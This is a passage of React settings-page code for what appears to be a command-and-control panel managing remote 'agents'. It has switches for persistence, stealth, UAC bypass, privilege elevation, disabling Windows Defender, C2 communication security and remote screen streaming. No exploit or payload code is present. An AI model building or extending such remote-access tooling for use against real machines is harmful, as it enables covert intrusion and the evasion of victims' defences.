                      onChange={(e) => updateSetting('email', 'recipient', e.target.value)}
                      placeholder="admin@yourcompany.com"
                    />
                  </div>

                  <div className="flex items-center justify-between">
                    <Label htmlFor="enable-tls">Enable TLS/SSL</Label>
                    <Switch
                      id="enable-tls"
                      checked={settings.email.enableTLS}
                      onCheckedChange={(checked) => updateSetting('email', 'enableTLS', checked)}
                    />
                  </div>

                  <Separator />
                  <div className="space-y-4">
                    <h4 className="font-medium">Notification Types</h4>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div className="flex items-center justify-between">
                        <Label htmlFor="notify-online">Agent Online</Label>
                        <Switch
                          id="notify-online"
                          checked={settings.email.notifyAgentOnline}
                          onCheckedChange={(checked) => updateSetting('email', 'notifyAgentOnline', checked)}
                        />
                      </div>
                      <div className="flex items-center justify-between">
                        <Label htmlFor="notify-offline">Agent Offline</Label>
                        <Switch
                          id="notify-offline"
                          checked={settings.email.notifyAgentOffline}
                          onCheckedChange={(checked) => updateSetting('email', 'notifyAgentOffline', checked)}
                        />
                      </div>
                      <div className="flex items-center justify-between">
                        <Label htmlFor="notify-failure">Command Failures</Label>
                        <Switch
                          id="notify-failure"
                          checked={settings.email.notifyCommandFailure}
                          onCheckedChange={(checked) => updateSetting('email', 'notifyCommandFailure', checked)}
                        />
                      </div>
                      <div className="flex items-center justify-between">
                        <Label htmlFor="notify-security">Security Alerts</Label>
                        <Switch
                          id="notify-security"
                          checked={settings.email.notifySecurityAlert}
                          onCheckedChange={(checked) => updateSetting('email', 'notifySecurityAlert', checked)}
                        />
                      </div>
                    </div>
                  </div>
                </>
              )}
            </CardContent>
          </Card>
        </TabsContent>

        {/* Agent Settings */}
        <TabsContent value="agents" className="space-y-6">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Users className="h-5 w-5" />
                Agent Configuration
              </CardTitle>
              <CardDescription>
                Default settings for agent deployment and behavior
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <Alert>
                <Info className="h-4 w-4" />
                <AlertDescription>
                  These settings apply to newly deployed agents. Changes to existing agents require reconnection.
                </AlertDescription>
              </Alert>

              <div className="space-y-4">
                <h4 className="font-medium">Persistence & Stealth</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="flex items-center justify-between">
                    <Label htmlFor="default-persistence">Default Persistence</Label>
                    <Switch
                      id="default-persistence"
                      checked={settings.agent.defaultPersistence}
                      disabled
                      onCheckedChange={(checked) => updateSetting('agent', 'defaultPersistence', checked)}
                    />
                  </div>
                  <div className="flex items-center justify-between">
                    <Label htmlFor="advanced-persistence">Advanced Persistence</Label>
                    <Switch
                      id="advanced-persistence"
                      checked={settings.agent.enableAdvancedPersistence}
                      disabled
                      onCheckedChange={(checked) => updateSetting('agent', 'enableAdvancedPersistence', checked)}
                    />
                  </div>
                  <div className="flex items-center justify-between">
                    <Label htmlFor="stealth-mode">Stealth Mode</Label>
                    <Switch
                      id="stealth-mode"
                      checked={settings.agent.enableStealth}
                      disabled
                      onCheckedChange={(checked) => updateSetting('agent', 'enableStealth', checked)}
                    />
                  </div>
                  <div className="flex items-center justify-between">
                    <Label htmlFor="silent-mode">Silent Mode</Label>
                    <Switch
                      id="silent-mode"
                      checked={settings.agent.silentMode}
                      onCheckedChange={(checked) => updateSetting('agent', 'silentMode', checked)}
                    />
                  </div>
                </div>
              </div>

              <Separator />

              <div className="space-y-4">
                <h4 className="font-medium">Privilege Escalation</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="flex items-center justify-between">
                    <Label htmlFor="uac-bypass">Enable UAC Bypass</Label>
                    <Switch
                      id="uac-bypass"
                      checked={settings.agent.enableUACBypass}
                      disabled
                      onCheckedChange={(checked) => updateSetting('agent', 'enableUACBypass', checked)}
                    />
                  </div>
                  <div className="flex items-center justify-between">
                    <Label htmlFor="auto-elevate">Auto-Elevate Privileges</Label>
                    <Switch
                      id="auto-elevate"
                      checked={settings.agent.autoElevatePrivileges}
                      disabled
                      onCheckedChange={(checked) => updateSetting('agent', 'autoElevatePrivileges', checked)}
                    />
                  </div>
                </div>
              </div>

              <Separator />

              <div className="space-y-4">
                <h4 className="font-medium">Defense Evasion</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="flex items-center justify-between">
                    <Label htmlFor="defender-disable">Disable Windows Defender</Label>
                    <Switch
                      id="defender-disable"
                      checked={settings.agent.enableDefenderDisable}
                      disabled
                      onCheckedChange={(checked) => updateSetting('agent', 'enableDefenderDisable', checked)}
                    />
                  </div>
                  <div className="flex items-center justify-between">
                    <Label htmlFor="quick-startup">Quick Startup Mode</Label>
                    <Switch
                      id="quick-startup"
                      checked={settings.agent.quickStartup}
                      onCheckedChange={(checked) => updateSetting('agent', 'quickStartup', checked)}
                    />
                  </div>
                </div>
              </div>

              <Alert>
                <AlertTriangle className="h-4 w-4" />
                <AlertDescription>
                  UAC bypass and Defender disable require administrative privileges and may trigger security alerts.
                </AlertDescription>
              </Alert>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Security Settings */}
        <TabsContent value="security" className="space-y-6">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Shield className="h-5 w-5" />
                Security Configuration
              </CardTitle>
              <CardDescription>
                Advanced security settings for C2 communications and access control
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-4">
                <h4 className="font-medium">Communication Security</h4>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <div className="flex items-center justify-between">
                    <Label htmlFor="encrypt-comm">Encrypt Communication</Label>
                    <Switch
                      id="encrypt-comm"
                      checked={settings.security.encryptCommunication}
                      onCheckedChange={(checked) => updateSetting('security', 'encryptCommunication', checked)}
                    />
                  </div>
                  <div className="flex items-center justify-between">
                    <Label htmlFor="validate-certs">Validate Certificates</Label>
                    <Switch
                      id="validate-certs"
                      checked={settings.security.validateCertificates}
                      onCheckedChange={(checked) => updateSetting('security', 'validateCertificates', checked)}
                    />
                  </div>
                  <div className="flex items-center justify-between">
                    <Label htmlFor="allow-self-signed">Allow Self-Signed</Label>
                    <Switch
                      id="allow-self-signed"
                      checked={settings.security.allowSelfSigned}
                      onCheckedChange={(checked) => updateSetting('security', 'allowSelfSigned', checked)}
                    />
                  </div>
                </div>
              </div>

              <Separator />

              <div className="space-y-4">
                <h4 className="font-medium">Rate Limiting</h4>
                <div className="flex items-center justify-between">
                  <Label htmlFor="rate-limit-enabled">Enable Rate Limiting</Label>
                  <Switch
                    id="rate-limit-enabled"
                    checked={settings.security.rateLimitEnabled}
                    onCheckedChange={(checked) => updateSetting('security', 'rateLimitEnabled', checked)}
                  />
                </div>
                {settings.security.rateLimitEnabled && (
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label htmlFor="rate-limit-requests">Requests per Window</Label>
                      <Input
                        id="rate-limit-requests"
                        type="number"
                        value={settings.security.rateLimitRequests}
                        onChange={(e) => updateSetting('security', 'rateLimitRequests', parseInt(e.target.value))}
                        min="1"
                        max="1000"
                      />
                    </div>
                    <div className="space-y-2">
                      <Label htmlFor="rate-limit-window">Window (seconds)</Label>
                      <Input
                        id="rate-limit-window"
                        type="number"
                        value={settings.security.rateLimitWindow}
                        onChange={(e) => updateSetting('security', 'rateLimitWindow', parseInt(e.target.value))}
                        min="1"
                        max="3600"
                      />
                    </div>
                  </div>
                )}
              </div>

              <Separator />

              <div className="space-y-4">
                <h4 className="font-medium">IP Blocking</h4>
                <div className="flex items-center justify-between">
                  <Label htmlFor="ip-blocking-enabled">Enable IP Blocking</Label>
                  <Switch
                    id="ip-blocking-enabled"
                    checked={settings.security.ipBlockingEnabled}
                    onCheckedChange={(checked) => updateSetting('security', 'ipBlockingEnabled', checked)}
                  />
                </div>
                {settings.security.ipBlockingEnabled && (
                  <div className="space-y-3">
                    <div className="flex gap-2">
                      <Input
                        id="new-blocked-ip"
                        value={newBlockedIp}
                        onChange={(e) => setNewBlockedIp(e.target.value)}
                        placeholder="Add IP address"
                      />
                      <Button
                        onClick={() => {
                          const ip = newBlockedIp.trim();
                          if (!ip) return;
                          const list = Array.isArray(settings.security.blockedIps) ? settings.security.blockedIps : [];
                          if (!list.includes(ip)) {
                            updateSetting('security', 'blockedIps', [...list, ip]);
                          }
                          setNewBlockedIp('');
                        }}
                      >
                        Add
                      </Button>
                    </div>
                    <div className="flex flex-wrap gap-2">
                      {(Array.isArray(settings.security.blockedIps) ? settings.security.blockedIps : []).map((ip) => (
                        <Badge key={ip} variant="secondary" className="flex items-center gap-2">
                          <span>{ip}</span>
                          <Button
                            variant="ghost"
                            size="sm"
                            onClick={() => {
                              const list = (settings.security.blockedIps || []).filter((x) => x !== ip);
                              updateSetting('security', 'blockedIps', list);
                            }}
                          >
                            <Trash2 className="h-4 w-4" />
                          </Button>
                        </Badge>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Advanced Settings */}
        <TabsContent value="advanced" className="space-y-6">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <SettingsIcon className="h-5 w-5" />
                Advanced Configuration
              </CardTitle>
              <CardDescription>
                Advanced settings and appearance customization
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-4">
                <h4 className="font-medium">WebRTC Configuration</h4>
                <div className="flex items-center justify-between">
                  <Label htmlFor="webrtc-enabled">Enable WebRTC</Label>
                  <Switch
                    id="webrtc-enabled"
                    checked={settings.webrtc.enabled}
                    onCheckedChange={(checked) => updateSetting('webrtc', 'enabled', checked)}
                  />
                </div>
                
                {settings.webrtc.enabled && (
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label htmlFor="max-bitrate">Max Bitrate (bps)</Label>
                      <Input
                        id="max-bitrate"
                        type="number"
                        value={settings.webrtc.maxBitrate}
                        onChange={(e) => updateSetting('webrtc', 'maxBitrate', parseInt(e.target.value))}
                        min="100000"
                        max="50000000"
                      />
                    </div>
                    <div className="space-y-2">
                      <Label>Quality Level</Label>
                      <Select
                        value={settings.webrtc.qualityLevel}
                        onValueChange={(value) => updateSetting('webrtc', 'qualityLevel', value)}
                      >
                        <SelectTrigger>
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="low">Low (640x480)</SelectItem>
                          <SelectItem value="medium">Medium (1280x720)</SelectItem>
                          <SelectItem value="high">High (1920x1080)</SelectItem>
                          <SelectItem value="auto">Auto (Adaptive)</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>
                  </div>
                )}
              </div>

              <Separator />

              {/* Theme Settings */}
              <div className="space-y-4">
                <h4 className="font-medium">Appearance</h4>
                <div className="space-y-2">
                  <Label>Theme</Label>
                  <div className="flex space-x-2">
                    <Button
                      variant={theme === 'light' ? 'default' : 'outline'}
                      size="sm"
                      onClick={() => setTheme('light')}
                      className="flex items-center space-x-2"
                    >
                      <Sun className="h-4 w-4" />
                      <span>Light</span>
                    </Button>
                    <Button
                      variant={theme === 'dark' ? 'default' : 'outline'}
                      size="sm"
                      onClick={() => setTheme('dark')}
                      className="flex items-center space-x-2"
                    >
                      <Moon className="h-4 w-4" />
                      <span>Dark</span>
                    </Button>
                    <Button
                      variant={theme === 'system' ? 'default' : 'outline'}
                      size="sm"
                      onClick={() => setTheme('system')}
                      className="flex items-center space-x-2"
                    >
                      <Monitor className="h-4 w-4" />
                      <span>System</span>
                    </Button>
                  </div>
                </div>
              </div>

              <Separator />

              {/* Data Management */}
              <div className="space-y-4">
                <h4 className="font-medium">Data Management</h4>
                <div className="flex flex-wrap gap-2">
                  <Button onClick={exportSettings} variant="outline" className="flex items-center space-x-2">
                    <Download className="h-4 w-4" />
                    <span>Export Config</span>
                  </Button>
                  <Button variant="outline" className="flex items-center space-x-2">
                    <Upload className="h-4 w-4" />
                    <span>Import Config</span>
                  </Button>
                  <Button variant="outline" className="flex items-center space-x-2">
                    <RefreshCw className="h-4 w-4" />
                    <span>Reset Defaults</span>
                  </Button>
                  <Button variant="destructive" className="flex items-center space-x-2">
                    <Trash2 className="h-4 w-4" />
                    <span>Clear All Data</span>
                  </Button>
                </div>
              </div>

              <Separator />

              <div className="space-y-4">
                <h4 className="font-medium">Registry Actions</h4>
                <div className="space-y-3">
                  {registryActionList.map((act) => {
                    const presence = (selectedAgent && registryPresence[selectedAgent] ? registryPresence[selectedAgent][act.id] : undefined);
                    const present = Boolean(presence?.present);
                    return (
                      <div key={act.id} className="flex items-center justify-between">
                        <Label htmlFor={`reg-${act.id}`}>{act.label}</Label>
                        <div className="flex items-center gap-3">
                          <Badge variant={present ? 'default' : 'secondary'} className={present ? 'bg-green-600' : ''}>
                            {present ? 'Present' : 'Not Found'}
                          </Badge>
                          <Switch
                            id={`reg-${act.id}`}
                            checked={Boolean(settings.registry?.actions?.[act.actionKey])}
                            onCheckedChange={(checked) => {
                              const next = { ...(settings.registry?.actions || {}) };
                              (next as any)[act.actionKey] = checked;
                              setSettings(prev => ({
                                ...prev,
                                registry: {
                                  ...prev.registry!,
                                  actions: next
                                }
                              }));
                              setHasChanges(true);
                              setSaved(false);
                              try {
                                if (selectedAgent) {
                                  checkRegistryPresence(selectedAgent, [{ id: act.id, hive: act.hive, path: act.path, key: act.key }]);
                                }
                              } catch {}
                            }}
                          />
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Bypasses content removed from settings; now available under main tablist */}
      </Tabs>
    </div>
  );
}
